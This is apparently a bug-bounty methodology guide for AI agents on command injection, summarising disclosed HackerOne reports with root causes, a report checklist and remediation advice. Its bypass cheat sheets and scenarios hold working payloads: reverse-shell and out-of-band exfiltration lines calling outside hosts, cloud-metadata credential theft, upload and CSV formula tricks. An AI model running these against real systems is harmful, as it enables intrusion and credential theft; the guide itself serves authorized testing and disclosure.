1. **User input concatenated into a shell string.** The dominant cause. `command = f"pip install {packages_str}"` (#3633123), `"gzip -dc #{@archive_path} | wc -c"` (#1609965), `` `gzip ... #{username}` `` (#214022). The feature is legitimate; the missing escaping is the bug.

2. **Misplaced trust in "non-shell" data.** Search filters, usernames, and emails are assumed harmless. Shopify #73567 put a `filter` value into a shell; IBM #410334 put an `email` value into `nslookup`; Discourse #214022 put a `username` into `gzip` via a DB restore.

3. **Argument injection (values as flags).** A value starting with `--` is interpreted by the binary as an option, not data. Git `--output`/`--no-index` (#653125, #682442), `gm convert -write |ps` (#212696), pip `--index-url` (#3633123), curl `-os` flag grouping (#3669305). Shell metacharacter filtering does not stop this.

4. **Incomplete blocklists.** #3633123 blocked `; & | \` $` but not `-`; #1859592 filtered only `;|&&` in `compose_cmd`; #50658/#313245 CLI interfaces assumed admin-only input. The filter enumerates the wrong dangerous set.

5. **Unsafe file processing.** ImageMagick/GraphicsMagick invoking Ghostscript with PostScript/EPS enabled; `%pipe%` policy not disabled (Shopify #422944, Semrush #403417, Basecamp #365271). A renamed `.gif` is still parsed as PostScript.

6. **Weak upload validation.** MIME/extension checks bypassed by null byte (#2054184), trailing space (#506646), or content-based polyglots. Any upload landing in an executable directory is RCE.

7. **Template/expression evaluation on untrusted input.** OGNL (Struts2 #1070532, Confluence #1327769/#1327701), SSTI (#3584149), WikiCloth Lua with `rubyluabridge` (#1401444), Airflow Jinja `BashOperator` (#1671140). Expression languages are code, not data.

8. **Unsafe deserialization.** .NET `ObjectDataProvider` in a cookie (#876708), Python pickles in notifications (#361341), PHP `unserialize()` (#415682). Deserialization turns stored data into object graphs with dangerous gadget chains.

9. **Code-execution features exposed by design.** Jenkins script console (#1125329, #2083771), Flink `jars/plan` (#1418891), Java debug console (#767482), evostream `launchprocess` on `localhost:7440` (#544928). The "feature" is the vulnerability when access control or exposure is wrong.

10. **Known-CVE instances left unpatched.** Pulse Secure CVE-2019-11510 (#671749, #678496, #591295), Drupal CVE-2018-7600 (#1063256), SharePoint CVE-2019-0604 (#534630), WebLogic (#810755), Confluence CVE-2021-26084 (#1327769). Patch management is part of the attack surface.

11. **Desktop-client privileged APIs.** `electron.shell.openExternal()` (#924151), custom protocol → `Process.Start` (#1001255), writable OpenSSL config enabling DLL load (#162955), XSS → RCE in an Electron webview (#899964). Client-side trust boundaries collapse into OS command execution.

12. **SSRF/XXE/LFI as a bridge to internal command primitives.** LFI + PHP object injection + XXE SSRF to port 1337 → RCE (#415682); XXE escalating SQLi to RCE (#361341); cloud metadata theft from a script console (#2083771).

### Root Cause → Black-Box Signature

| Root cause | Signature while testing | Confirming report |
|---|---|---|
| Shell metacharacter injection | `;sleep 10` changes response time; OOB hit on `nslookup` | #73567, #410334 |
| Argument/flag injection | dash-prefixed value produces behavior change or file write; no metachar needed | #653125, #212696, #3633123 |
| Unsafe image processor | non-image accepted; ` -rotate 90` visibly transforms; `%pipe%` executes | #422944, #365271, #212696 |
| Template/expression injection | `{{7*7}}` → `49`; expression syntax reflected | #3584149, #1070532 |
| Deserialization | cookie/blob change alters app behavior; gadget error in stack trace | #876708, #361341 |
| Upload-to-shell | executable served from upload dir; null byte / trailing space accepted | #2054184, #506646 |
| Exposed code-execution feature | admin/Jenkins/Flink console reachable | #1125329, #1418891, #544928 |
| Unpatched known CVE | version banner matches an RCE CVE | #591295, #1063256, #534630 |
| CSV formula injection | cell begins with `=`/`+`/`-`/`@`; calc fires on open | #124223, #160500 |

---

## Bypass Techniques

### Shell Metacharacter / Whitespace Filters

```
${IFS}                       # whitespace substitute: wget${IFS}<collab>
$IFS                         # shorter form
%0A  /  \n                   # newline as separator
;  |  ||  &&  &  `  $()  <>   # alternate separators/substitution
'id'  "id"  \id              # quote/escape variations
a${IFS}b                     # split a token when spaces are blocked
```

### Argument / Flag Injection Bypasses

```
--output=/tmp/x              # long flag
-o/tmp/x                     # short flag, attached value
--index-url=http://attacker  # pip flag that survives metachar filters
-w |ps                       # GraphicsMagick -write pipe trick (Imgur #212696)
```
When `;|&&` are filtered (#1859592), flag semantics still work — the payload contains none of those characters.

### Image / Ghostscript Filter Bypasses

```
rename PostScript to .gif/.jpg   # Basecamp #365271 — content parsed, not extension
%!PS + legal + { null restore } stopped { pop } if   # DeviceN policy restore (ImageTragick)
%pipe%<command>                  # Ghostscript OutputFile command execution
```
Appending innocuous converter flags first (` -rotate 90`) confirms control before escalating.

### Upload Filter Bypasses

```
poc.asp%00.png     # null-byte truncation (#2054184)
poc.jsp  (space)   # trailing space behind extension (#506646)
.gif containing PostScript  # magic/content mismatch (#365271)
```

### Encoding / Parser-Confusion Bypasses

```
\u0000                # null byte breaking a JSON/GraphQL query (#1000567)
%0A-3+3+cmd|' /C calc'!D2   # CSV esc_csv() bypass (#160500)
";=cmd|' /C calc'!A0        # CSV without double quotes (#124223)
```

### Template / Expression Bypasses

```
{{7*7}} → {{popen('id').read()}}
{{#luaexpr:...}} / <lua>   # sandbox escape when rubyluabridge installed (#1401444)
%{...OGNL...}              # injected in a header (S2-045) or form field (Confluence)
```

### Known-CVE / Patch-Gap Bypasses

- Disclosed hardening PRs can miss a sink: #3874004 found a CVE-2022-23915 hardening PR but "no public report covering this missed get_file() sink."
- Chained CVEs: pre-auth file read + post-auth command injection → pre-auth RCE (Pulse Secure, #591295).
- Bypass a previous fix: #124223 bypassed #111192's CSV mitigation with a differently quoted payload.

### Desktop / Client-Side Bypasses

```
file:///System/Applications/Calculator.app   # shell.openExternal (#899964)
pwn.desktop via public Samba share           # shell.openExternal RCE (#924151)
NordVPN.Notification:<base64-json-OpenUrl:calc.exe>  # custom protocol → Process.Start (#1001255)
overwrite C:\usr\local\ssl\openssl.cnf       # OpenSSL loads attacker DLL (#162955)
```

### Encoding Ladder for Filtered Input

Apply one layer at a time and observe which the backend decodes:

```
; id
%3B%20id                     # URL-encoded metacharacters
%253B%2520id                 # double URL-encoded
\u0000 / %00                 # null byte to truncate a filename (#2054184)
\u0000 in JSON string        # parser confusion (#1000567)
${IFS}                        # whitespace substitute (Imgur #212696)
;=cmd|' /C calc'!A0          # CSV context, not a shell (#124223)
```

### Shell-Specific Notes

- `/bin/sh` (dash) does not support some Bash-isms; `$(...)` and backticks are portable, but `<(process substitution)` is not. The usual sink is a wrapper that calls `sh -c` on the assembled string.
- Windows `cmd.exe` uses `&`, `&&`, `|`, `^` escapes — not `$()` or backticks; use `& whoami` / `%COMSPEC%` (SharePoint #534630, NordVPN #1001255).
- When only an argument vector is controllable (no shell), metacharacters are inert: switch entirely to flag injection (`--output`, `-oFile`, `--index-url`) — see GitLab #653125/#682442, curl #3669305, AWS #3633123.

---

## Gate 0 Validation

Before writing the report, confirm all three. (Command injection reports are frequently N/A'd for being blind-without-proof or for naming the wrong field.)

1. **What can the attacker DO right now?**
   - Show a concrete effect: reflected `id`/`cat /etc/passwd` output, a shell/reverse connection, a file written (`/tmp/x`), or a uniquely attributable OOB callback carrying command output.
   - For blind cases: demonstrate differential timing (`sleep 0` baseline vs `sleep 10`) **and** an OOB hit. "The app is slow" is not proof.
   - If the only evidence is a metacharacter reflected in an error, you have not proven execution — escalate to `id`/callback.

2. **What does the victim LOSE?**
   - Command execution as which user — web user, root/SYSTEM (#544928), or a service account with cloud credentials (#2083771)?
   - Is it pre-auth (high value: #591295, #1125329) or admin-only (still valid: #214022, #313245)? State the auth requirement precisely.
   - Quantify the blast radius: kubectl/cloud creds, DB dumps, internal pivot, other tenants. The Shopify kitcrm report showed datadog/bugsnag/papertrail/newrelic dashboards after the reverse shell — that is the loss.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the sink still live and the parameter still present?
   - Does the callback/timing fire reliably, not intermittently? (DNS-rebinding/race cases aside.)
   - Can a second person follow the steps and get the same command output?
   - For image-processing, is the exact polyglot file included or reproducible?
   - Resolve flakiness before submitting; note any required auth state, feature flag (#1609965 was behind a feature flag), or installed gem (#1401444 required `rubyluabridge`).

**Attribution reminder:** attribute the callback/output to ONE parameter. Batch-firing payloads across several fields proves a sink exists but not which field to fix — run negative controls and name the live field in the report.

### Minimal Report Checklist

- [ ] Vulnerable endpoint + exact parameter named (not "the search feature").
- [ ] HTTP request with the working payload, headers, and auth state shown.
- [ ] Proof of execution: reflected `id`/file contents, unique OOB hit with exfiltrated output, or timing differential against a baseline.
- [ ] Privilege context established (`id`/`whoami`, SYSTEM/root vs web user).
- [ ] Impact chain documented (IAM keys, DB secrets, internal pivot, file write).
- [ ] Reproduction steps a second person can follow in ≤10 minutes, including feature flags (#1609965), optional gems (#1401444), or required file formats (#422944).
- [ ] Negative controls listed (parameters that did *not* fire) so the client patches the right field.
- [ ] Remediation guidance: use allowlisted argument arrays / `execve`-style calls instead of a shell, escape shell metacharacters, remove `%pipe%`/PostScript from image policies, and patch the underlying CVE.

---

## Real Impact Examples

### Scenario A: Image Upload → Ghostscript → Reverse Shell → Full Cloud Visibility (Shopify kitcrm Pattern, #422944)
The seller onboarding page for priority-product images accepted uploads without verifying they were real JPG/PNG/GIF. Uploading a PostScript (ImageTragick) payload with `mark /OutputFile (%pipe%python -c '...connect back...')` caused the server's image pipeline to execute the embedded command, yielding a reverse shell from `52.38.69.6`. From the shell the researcher reached datadog dashboards, bugsnag, papertrail, and newrelic. Impact: arbitrary OS command execution on production, lateral visibility into monitoring and cloud infrastructure. The same class appeared in Semrush (#403417, `%pipe%bash -i >& /dev/tcp/...`) and Basecamp (#365271, EPS renamed to `.gif`).

### Scenario B: Filter Parameter → Blind Shell → AWS IAM Credential Theft (Jenkins Pattern, #2083771 / #1125329)
An exposed Jenkins script console at `/jenkins/script` (and `/_script`) allowed unauthenticated Groovy execution. `println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text` returned live AWS STS keys (`AccessKeyId`, `SecretAccessKey`, token). Impact: full AWS resource management — create/delete resources, read/write data, manage IAM users/roles, console/CLI access — plus a reverse shell. This shows command injection chaining to cloud account compromise; pre-auth exposure makes it critical.

### Scenario C: CLI Argument Injection into git → Arbitrary File Write (GitLab Pattern, #653125 / #682442)
The Commits API's `ref_name` was unsanitized, so a value of `--output=/tmp/some_file` was interpreted by `git log`/`git rev-list` as an option, writing commit data to an attacker-chosen path (`--output=/tmp/written`). The Search API's `blobs` scope with `ref=--no-index` leaked any file under `/var/opt/gitlab/gitaly`, including `config.toml`. Impact: arbitrary file write/read in the GitLab install, a stepping stone to code execution and secret theft — all without a single shell metacharacter.

### Scenario D: Pre-Auth RCE via Chained VPN CVEs (Twitter/xAI Pulse Secure Pattern, #591295)
DEVCORE researchers chained Pulse Secure SSL VPN CVEs: pre-auth arbitrary file read (CVE-2019-11510, CVSS 10) to steal `/data/runtime/mtmp/lmdb/dataa/data.mdb` (cleartext credentials), then post-auth command injection (CVE-2019-11539, CVSS 8) to achieve pre-auth RCE — Critical, $20,160. Impact: complete compromise of the VPN appliance and the corporate intranet behind it. Related instances #671749 and #678496 show the same chain in the wild.

### Scenario E: Search Filter → Blind Shell → Data Exfiltration (Shopify wpt.ec2 Pattern, #73567)
A test endpoint at `wpt.ec2.shopify.com/testlog.php` accepted a `filter` parameter that was passed to a shell. Entering `$(`sleep 20`)` made the response return ~20 seconds later; the researcher then used `filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29` — i.e. `$(`wget sandbox.prakharprasad.com/$(id)`)` — to exfiltrate the output of `id` to an Apache access log. Impact: blind OS command execution on a Shopify subdomain with full command-output exfiltration via OOB. This is the canonical example of using `$(...)` plus OOB to convert a blind primitive into a provable one.

### Scenario F: Git Flag Injection → Arbitrary File Write / Read (GitLab Pattern, #653125 / #682442)
The Commits API accepted a `ref_name` of `--output=/tmp/written`; gitaly's `git log --format=... --follow --output=/tmp/written -- .` wrote commit data to that path, and the subsequent `git rev-list --count --output=...` truncated it. Separately, the search API with `scope=blobs`, `search=.`, `ref=--no-index` read any file under `/var/opt/gitlab/gitaly`, including `config.toml`. Impact: attacker-controlled file write and read inside the GitLab install using only a leading-dash value — no shell metacharacter required.

### Scenario G: CSV Formula Injection → Code Execution on the Victim (Shopify/Discourse Pattern, #124223 / #214022)
In one case an export feature wrote a username into a `gzip` command in backticks; an admin-modified username `test.txt;wget mrzioto.com` forced a `wget` on restore/export (#214022, $512). In others, CSV exports placed unescaped fields into spreadsheet cells; payloads like `";=cmd|' /C calc'!A0` (#124223) and `%0A-3+3+cmd|' /C calc'!D2` (#160500) executed `calc` when the exported CSV was opened in Excel. Impact: command execution on the server (Discourse) or on the machine of whoever opens the report (CSV/DDE), demonstrating that "data" fields can be command sinks.

---

## Disclosed Report Citations (30 — all IDs present in the study pack)

1. **X / xAI — Potential pre-auth RCE on Twitter VPN** ([H1 #591295](https://hackerone.com/reports/591295)) — chained pre-auth file read + post-auth command injection (Pulse Secure CVE-2019-11510/11539), Critical / $20,160 / 2019.
2. **GitLab — RCE via the DecompressedArchiveSizeValidator and Project BulkImports** ([H1 #1609965](https://hackerone.com/reports/1609965)) — `gzip -dc #{@archive_path} | wc -c` command injection, import-feature, Critical CVSS 9.9 / $33,510 / 2022.
3. **Shopify — H1514 RCE on kitcrm via bulk customer update of Priority Products** ([H1 #422944](https://hackerone.com/reports/422944)) — ImageTragick/Ghostscript `%pipe%` upload-to-RCE, image-processing, Medium / 2018.
4. **Semrush — RCE on www.semrush.com/my_reports on Logo upload** ([H1 #403417](https://hackerone.com/reports/403417)) — PostScript `%pipe%bash -i >& /dev/tcp/...` via unpatched ImageMagick, Critical / 2018.
5. **Basecamp — Remote code execution on Basecamp.com** ([H1 #365271](https://hackerone.com/reports/365271)) — EPS/PostScript renamed to `.gif`, `ping -c1 attacker.com`, image-processing, Critical / $5,000 / 2018.
6. **Imgur — RCE by command line argument injection to gm convert in /edit/process?a=crop** ([H1 #212696](https://hackerone.com/reports/212696)) — `-write |ps${IFS}aux|curl...` argument injection, Critical / 2017.
7. **Shopify — Attention! Remote Code Execution at wpt.ec2.shopify.com** ([H1 #73567](https://hackerone.com/reports/73567)) — `$(`wget...$(id))` in filter param, blind OOB via `id` exfil, None / 2015.
8. **IBM — Reflected XSS and Blind OOB command injection at dstuid-ww.dst.ibm.com** ([H1 #410334](https://hackerone.com/reports/410334)) — `&nslookup` via email param, blind-oob/subdomain, High / 2018.
9. **U.S. Dept Of Defense — Unauth RCE on Jenkins Instance** ([H1 #1125329](https://hackerone.com/reports/1125329)) — `/_script` Groovy `println "whoami".execute().text`, recon/admin-internal, Critical / 2021.
10. **U.S. Dept Of Defense — RCE and AWS IAM Credentials Exfiltration** ([H1 #2083771](https://hackerone.com/reports/2083771)) — Jenkins `/jenkins/script` → IMDS credential theft, cloud-metadata/time-based, Critical / 2023.
11. **GitLab — Git flag injection leading to file overwrite and potential RCE** ([H1 #653125](https://hackerone.com/reports/653125)) — `ref_name=--output=/tmp/file` into git log/rev-list, Critical / $3,500 / 2019.
12. **GitLab — Git flag injection, Search API with scope 'blobs'** ([H1 #682442](https://hackerone.com/reports/682442)) — `ref=--no-index` file read via git, High / $7,000 / 2019.
13. **GitLab — RCE via github import** ([H1 #1672388](https://hackerone.com/reports/1672388)) — Octokit/Sawyer object misuse in `parallel_scheduling.rb`, import-feature, Critical CVSS 9.9 / 2022.
14. **GitLab — RCE via WikiCloth markdown rendering if rubyluabridge is installed** ([H1 #1401444](https://hackerone.com/reports/1401444)) — `#luaexpr:` sandbox escape → OS command, template-engine, None / $3,000 / 2021.
15. **Apache Airflow (Internet Bug Bounty) — CVE-2022-38362 Docker Provider <3.0 RCE in example dag** ([H1 #1671140](https://hackerone.com/reports/1671140)) — `{{params.source_location}}` → BashOperator, template-injection, High CVSS 8.8 / 2022.
16. **Aiven — Apache Flink RCE via GET jar/plan API Endpoint** ([H1 #1418891](https://hackerone.com/reports/1418891)) — unrestricted `jars/{jar_id}/plan` class loading → RCE, api-endpoint, Critical / $6,000 / 2021.
17. **U.S. Dept Of Defense — Unauthenticated Remote Command Injection via SharePoint CVE-2019-0604** ([H1 #534630](https://hackerone.com/reports/534630)) — XAML `<System:String>/c calc</System:String>` RCE, deserialization/xml-parser, High / 2019.
18. **MTN Group — RCE Apache Struts2 (S2-045)** ([H1 #1070532](https://hackerone.com/reports/1070532)) — OGNL injected in Content-Type header, error-based, High / 2021.
19. **U.S. Dept Of Defense — RCE on CVE-2021-26084 (Confluence OGNL)** ([H1 #1327769](https://hackerone.com/reports/1327769)) — `doenterpagevariables.action` OGNL injection, Critical / 2021.
20. **U.S. Dept Of Defense — RCE on CVE-2021-26084 (Confluence OGNL)** ([H1 #1327701](https://hackerone.com/reports/1327701)) — `createpage-entervariables.action?SpaceKey=x`, Critical / 2021.
21. **U.S. Dept Of Defense — Privilege Escalation to SYSTEM via unauthenticated command execution** ([H1 #544928](https://hackerone.com/reports/544928)) — evostream `launchprocess` on `localhost:7440`, admin-internal, Critical CVSS 9.6 / 2019.
22. **Discourse — Admin Command Injection via username in user_archive ExportCsvFile** ([H1 #214022](https://hackerone.com/reports/214022)) — `test.txt;wget mrzioto.com` into gzip backticks, export-feature, High / $512 / 2017.
23. **U.S. Dept Of Defense — RCE via File Upload with Null-Byte Truncated Extension** ([H1 #2054184](https://hackerone.com/reports/2054184)) — `poc.asp` null byte in `poc.asp.png` → webshell ?cmd=dir, Critical / 2023.
24. **U.S. Dept Of Defense — Arbitrary File Reading leads to RCE in Pulse Secure SSL VPN** ([H1 #678496](https://hackerone.com/reports/678496)) — CVE-2019-11510 path traversal → cleartext creds → post-auth RCE, Critical / 2019.
25. **U.S. Dept Of Defense — Pulse Secure File disclosure, clear text and potential RCE** ([H1 #671749](https://hackerone.com/reports/671749)) — CVE-2019-11510 normalization LFI → RCE chain, unicode-normalization/path-traversal, Critical / 2019.
26. **U.S. Dept Of Defense — Remote Code Execution through DNN Cookie Deserialization** ([H1 #876708](https://hackerone.com/reports/876708)) — `DNNPersonalization` cookie `ObjectDataProvider` gadget, cookie-handling/deserialization, High / 2020.
27. **Rocket.Chat — Insecure use of shell.openExternal() in Desktop App leading to RCE** ([H1 #924151](https://hackerone.com/reports/924151)) — crafted link → `shell.openExternal()` → `.desktop`/SMB execution, Critical CVSS 9.0 / 2020.
28. **Nord Security — Possible RCE through Windows Custom Protocol on Windows client** ([H1 #1001255](https://hackerone.com/reports/1001255)) — `NordVPN.Notification:` → `Process.Start` with controllable `OpenUrl`, sso-oauth/xml-parser, Medium CVSS 6.8 / 2020.
29. **Internet Bug Bounty — RCE via ssh:// URIs in multiple VCS** ([H1 #260005](https://hackerone.com/reports/260005)) — `ssh://` argument injection in Git/SVN/Mercurial (CVE-2017-9800/1000116/1000117), public-code-search, High CVSS 8.8 / 2017.
30. **Amazon Web Services — Incomplete Input Sanitization in CodeInterpreter install_packages Allows Command Injection via pip Flags** ([H1 #3633123](https://hackerone.com/reports/3633123)) — `--index-url` bypass of a `; & | \` $` blocklist, dependency-confusion/filter-bypass / 2026.

---

## Related Skills & Chains

- **`hunt-ssrf`** — SSRF/LFI/XXE is often the bridge to a command primitive. Chain: XXE/LFI → internal service on port 1337 → unserialize → RCE (#415682); SSRF → IMDS credential theft after a shell (#2083771).
- **`offensive-ssti`** — SSTI and command injection overlap where an expression reaches `popen`/`system`. Chain: `{{7*7}}` detection → `{{popen('id').read()}}` RCE (curl #3584149, GitLab #1401444, Airflow #1671140).
- **`offensive-xxe`** — XXE reads local files and reaches internal services. Chain: XXE file read → config/secret → command injection; or SQLi escalated through unsafe pickle deserialization (#361341).
- **`offensive-deserialization`** — Gadget chains (ObjectDataProvider, pickles, PHP unserialize) frequently terminate in OS command execution (#876708, #361341, #415682).
- **`offensive-file-upload`** — Weak upload validation is the delivery mechanism for ImageTragick/Ghostscript payloads and webshells (#422944, #365271, #2054184, #506646).
- **`offensive-waf-bypass`** — Load filter-evasion primitives (`${IFS}`, encoding, flag injection) before attacking blocklisted parameters (#3633123, #1859592, #124223).
- **`hunt-cloud-misconfig`** — After a shell, pull IMDS credentials and pivot into the cloud account (#2083771). Exposed consoles (Jenkins, Flink, WebLogic) are the entry point.
- **`triage-validation`** — Apply the Gate 0 gate: prove execution (reflected command output or uniquely attributed OOB/timing), name the exact sink parameter, and supply a 10-minute reproduction before submission.

### Common Chain Primitives

- `argument injection → arbitrary file write → webshell` (GitLab `--output` #653125; null-byte ASP #2054184)
- `image upload → Ghostscript %pipe% → reverse shell → cloud/monitoring access` (#422944)
- `filter param → blind shell → OOB exfil of id` (#73567)
- `known CVE → pre-auth file read → credential theft → post-auth command injection → RCE` (#591295, #678496)
- `XXE/LFI → internal service → unserialize → RCE` (#415682)
- `XSS → shell.openExternal/Process.Start → client RCE` (#899964, #924151, #1001255)
- `command shell → IMDS credential theft → cloud account compromise` (#2083771)
- `CSV formula injection → DDE/calc execution on report recipient` (#124223, #160500)

Load the relevant offensive skill before attempting the second hop of any chain.
